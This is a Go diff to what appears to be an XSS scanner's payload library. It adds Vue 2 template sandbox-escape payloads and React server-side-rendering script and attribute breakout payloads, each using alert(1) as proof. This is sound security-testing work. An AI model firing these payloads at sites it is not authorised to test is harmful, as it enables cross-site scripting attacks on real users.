@@ -190,3 +190,54 @@ func jinjaPayloads() []PayloadTemplate {
 	// not XSS, and would generate false positives in an XSS scanner.
 	return nil
 }
+
+// Vue2SandboxPayloads are Vue 2.x-specific sandbox escape payloads.
+// Vue 3 REMOVED the template sandbox — these do not work there.
+func Vue2SandboxPayloads() []PayloadTemplate {
+	return []PayloadTemplate{
+		{
+			Value:    `{{_c.constructor('alert(1)')()}}`,
+			Context:  context.ContextTemplate,
+			Severity: model.Critical,
+			Desc:     "Vue 2 sandbox escape via _c.constructor",
+		},
+		{
+			Value:    `{{constructor.constructor('alert(1)')()}}`,
+			Context:  context.ContextTemplate,
+			Severity: model.Critical,
+			Desc:     "Vue 2 sandbox escape via constructor chain",
+		},
+		{
+			Value:    `{{$root.constructor('alert(1)')()}}`,
+			Context:  context.ContextTemplate,
+			Severity: model.High,
+			Desc:     "Vue 2 sandbox escape via $root",
+		},
+	}
+}
+
+// ReactSSRPayloads are React SSR-specific injection payloads: breaking out
+// of embedded JSON state scripts (<script>window.__data=...user input...</script>)
+// and dangerouslySetInnerHTML hydration.
+func ReactSSRPayloads() []PayloadTemplate {
+	return []PayloadTemplate{
+		{
+			Value:    `</script><script>alert(1)</script>`,
+			Context:  context.ContextHTMLBody,
+			Severity: model.Critical,
+			Desc:     "React SSR JSON state breakout (__NEXT_DATA__/window.__data)",
+		},
+		{
+			Value:    `"}});</script><script>alert(1)</script>//`,
+			Context:  context.ContextHTMLBody,
+			Severity: model.Critical,
+			Desc:     "React SSR serialized props breakout",
+		},
+		{
+			Value:    `"><img src=x onerror=alert(1)>`,
+			Context:  context.ContextHTMLAttrValue,
+			Severity: model.High,
+			Desc:     "React SSR attribute injection (unescaped attr)",
+		},
+	}
+}
